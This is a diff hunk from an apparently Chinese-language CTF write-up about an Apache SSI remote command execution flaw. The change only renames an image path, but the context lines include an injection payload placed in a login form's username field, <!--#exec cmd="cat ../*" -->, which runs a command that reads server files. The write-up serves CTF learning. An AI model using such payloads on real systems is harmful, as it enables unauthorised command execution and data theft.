@@ -59,7 +59,7 @@ shtml存在一个Apache SSI 远程命令执行漏洞，在登录界面使用如�
 username=<!--#exec cmd="cat ../*" -->&password=2020666
 ```
 
-![](<../.gitbook/assets/image (13) (1) (1).png>)
+![](<../.gitbook/assets/image (13) (1) (1) (1).png>)
 
 再返回返回的`Url_is_here`就可以了
 
